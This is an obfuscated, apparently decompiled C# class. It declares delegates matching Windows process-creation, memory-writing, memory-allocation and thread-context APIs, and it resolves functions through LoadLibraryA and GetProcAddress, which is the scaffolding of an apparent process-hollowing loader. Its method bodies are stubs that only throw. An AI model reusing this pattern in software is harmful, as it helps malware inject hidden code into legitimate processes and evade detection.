using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class6
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate0(string ietrditgqlkybeccz, StringBuilder gisswaffbyrczcjbek, IntPtr tddvzyuanpptiley, IntPtr ycqlhnopsrfcrqntkq, [MarshalAs(UnmanagedType.Bool)] bool eaujxngrghxreezr, int jagdrflhlgcppngkw, IntPtr qftzyqcyyhqalvcldis, string bvdqwpklthusqazhws, byte[] fjplrhicndhdizglrwr, IntPtr[] poegrpgaokukwhbc);

	public delegate bool Delegate1(IntPtr hiknaiiqyqcrskcd, IntPtr dvjxepuaeohgthdhpei, byte[] rayhtovktvtpnqsprofv, uint gobjshapdwhffjwrqj, int sfztruhrredwfadfexn);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate2(IntPtr hpjvxhftkugsddeoaxrv, IntPtr iesuuhchynegvvzlqz, ref IntPtr aanqiibdlcdgsyaiuthg, int kgvischhvgphidni, ref IntPtr tnieryiajydgnfah);

	public delegate IntPtr Delegate3(IntPtr ptxvzenhfiyxjrukuiaa, IntPtr gwsrduhhhelsotxpp, IntPtr wscnyxncgrtvlwsjy, int oykcpqvtqoonaicn, int bsgijtjjdskoknjpk);

	public delegate uint Delegate4(IntPtr pchcqqapnkhkylpkukd, IntPtr pbqsnhkivlaqctbphk);

	public delegate uint Delegate5(IntPtr lcelxaicxuenriantqju);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate6(IntPtr roayflzfrbzsjwfviu, uint[] gxhyqcduubsjikzqk);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool Delegate7(IntPtr fxhcxwrwbwnndyrzoofq, uint[] idtsddwgyflpctwdc);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public static T smethod_0<T>(string string_0, string string_1)
	{
		throw new ApplicationException();
	}

	public static bool smethod_1(byte[] byte_0, string string_0)
	{
		throw new ApplicationException();
	}
}
